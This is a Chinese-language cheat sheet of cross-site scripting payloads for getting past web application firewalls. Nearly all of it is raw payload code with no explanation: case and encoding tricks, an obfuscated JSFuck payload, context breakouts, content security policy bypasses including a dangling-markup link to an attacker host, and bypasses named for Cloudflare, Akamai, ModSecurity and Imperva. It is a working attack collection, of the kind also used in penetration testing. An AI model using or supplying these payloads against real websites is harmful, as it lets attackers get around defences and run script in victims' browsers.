# XSS WAF 绕过技术

## 标签绕过

### 大小写混合

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SVg OnLoAd=alert(1)>
<BODY ONLOAD=alert(1)>
<dETAILS OPEN ONTOGGLE=alert(1)>
```

### 闭合绕过

```html
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
```

### 新标签

```html
# HTML5 新标签
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<keygen onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<menu id="x" type="context" onshow=alert(1)><menuitem label="test">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
```

### 无标签

```html
# 事件处理器
onfocus=alert(1) autofocus
onmouseover=alert(1)
onerror=alert(1)
onclick=alert(1)

# 伪协议
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## 编码绕过

### HTML 实体编码

```html
# 十进制
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#0000097&#0000108&#0000101&#0000114&#0000116(1)>

# 十六进制
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

# 混合
<img src=x onerror=&#x61;l&#101;&#x72;t(1)>
```

### URL 编码

```html
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
<img src=x onerror="eval(unescape('%61%6c%65%72%74%28%31%29'))">
```

### Unicode 编码

```html
# Unicode 转义
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

# Unicode 变体
<script>\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}(1)</script>

# 过长 UTF-8
<script>%c0%ae%c0%ae...</script>
```

### Base64 编码

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### JSFuck

```html
<img src=x onerror="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()">
```

## 属性绕过

### 事件处理器变体

```html
# 常见事件
onload=alert(1)
onerror=alert(1)
onclick=alert(1)
onmouseover=alert(1)
onfocus=alert(1)
onblur=alert(1)

# 不常见事件
onanimationend=alert(1)
onanimationstart=alert(1)
ontransitionend=alert(1)
onpointerenter=alert(1)
onpointerover=alert(1)
ondrag=alert(1)
ondragend=alert(1)
ondragenter=alert(1)
oninput=alert(1)
oninvalid=alert(1)
onsearch=alert(1)
oncut=alert(1)
oncopy=alert(1)
onpaste=alert(1)
onpageshow=alert(1)
onresize=alert(1)
onscroll=alert(1)
ontoggle=alert(1)
```

### 空格变体

```html
<img src=x onerror=alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
<img src=x onerror%09=alert(1)>
<img src=x onerror%0a=alert(1)>
<img src=x onerror%0d=alert(1)>
<img src=x onerror%0c=alert(1)>
<img src=x onerror%00=alert(1)>
```

### 引号变体

```html
<img src=x onerror=alert(1)>
<img src=x onerror='alert(1)'>
<img src=x onerror="alert(1)">
<img src=x onerror=`alert(1)`>
<img src=x onerror=alert(1)>
```

## 函数绕过

### alert 替代

```html
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval('al'+'ert(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',1000)</script>
<script>Function('alert(1)')()</script>
<script>[]['constructor']['constructor']('alert(1)')()</script>
<script>this['alert'](1)</script>
<script>window['alert'](1)</script>
<script>top['alert'](1)</script>
<script>self['alert'](1)</script>
<script>parent['alert'](1)</script>
<script>frames['alert'](1)</script>
```

### 拼接构造

```html
<script>window['al'+'ert'](1)</script>
<script>window['x61lert'](1)</script>
<script>eval('ale'+'rt(1)')</script>
<script>eval(8680439..toString(30))(1)</script>
```

## 上下文绕过

### JavaScript 上下文

```javascript
# 字符串内
'-alert(1)-'
'-alert(1)//
';alert(1)//
</script><script>alert(1)</script>

# 对象属性
{"x":"-alert(1)//"}
{"x":"'-alert(1)-'"}

# 数组
[alert(1)]

# 模板字符串
${alert(1)}
```

### HTML 属性上下文

```html
# 双引号属性
" onmouseover=alert(1) x="
" onfocus=alert(1) autofocus x="

# 单引号属性
' onmouseover=alert(1) x='
' onfocus=alert(1) autofocus x='

# 无引号属性
onmouseover=alert(1) x=
onfocus=alert(1) autofocus x=
```

### URL 上下文

```html
<a href="javascript:alert(1)">
<a href="  javascript:alert(1)">
<a href="	javascript:alert(1)">
<a href="
javascript:alert(1)">
<a href="javascript:alert(1)//http://">
<a href="data:text/html,<script>alert(1)</script>">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## CSP 绕过

### script-src 绕过

```html
# JSONP
<script src="https://www.google.com/complete/search?client=chrome&q=test&callback=alert"></script>

# AngularJS
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp><div ng-focus="x=$event.view.alert(1)" tabindex=0>test</div></div>

# Dangling Markup
<link rel="import" href="https://attacker.com/">
```

### object-src 绕过

```html
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

### 使用 meta

```html
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
```

## WAF 特定绕过

### Cloudflare

```html
<img src=x onerror="alert`1`">
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg/onload=alert(1)//
<svg/onload=alert&lpar;1&rpar;>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Akamai

```html
<script>window['alert'](1)</script>
<script>self['alert'](1)</script>
<script>top['alert'](1)</script>
<script>parent['alert'](1)</script>
<script>frames['alert'](1)</script>
```

### ModSecurity

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>[]['constructor']['constructor']('alert(1)')()</script>
```

### Imperva

```html
<img src=x onerror="window['alert'](1)">
<img src=x onerror="eval('al'+'ert(1)')">
<svg/onload=window['alert'](1)>
```